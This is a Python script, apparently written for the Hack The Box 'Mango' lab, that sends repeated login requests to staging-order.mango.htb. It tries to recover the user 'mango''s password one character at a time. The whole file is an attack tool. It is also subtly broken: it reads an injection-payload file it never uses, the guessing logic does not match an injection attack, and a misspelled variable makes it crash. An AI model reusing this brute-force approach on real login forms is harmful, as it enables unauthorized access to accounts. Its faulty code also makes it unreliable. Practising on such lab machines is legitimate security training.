import requests
import array
import string
import urllib
s = requests.session()

file = open("sqli.txt", "r").read()
file = file.split("\n")
password = '3mXK8RhU~f{]f5H'
list = []
for c in string.printable:
	list.append(c + password)
for f in list:
	parameters = {
		"username":"mango",
		"password": f,
		"login":"login"
	}
	headers = {
	"Host": "staging-order.mango.htb",
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate",
	"Content-Type": "application/x-www-form-urlencoded",
	"Origin": "http://staging-order.mango.htb",
	"Connection": "keep-alive",
	"Referer": "http://staging-order.mango.htb/index.php",
	"Upgrade-Insecure-Requests": "1"
	}

	response = s.post("http://staging-order.mango.htb/index.php",headers=headers,data=parameters)
	print (response.url)
	print (response.text)
	if "OK" in resonse.text:
		print ( "[+] PASSWORD FOUND : " + str(f))
	else:
		print ( ">[-] tried " + f + " with no luck [-]<")
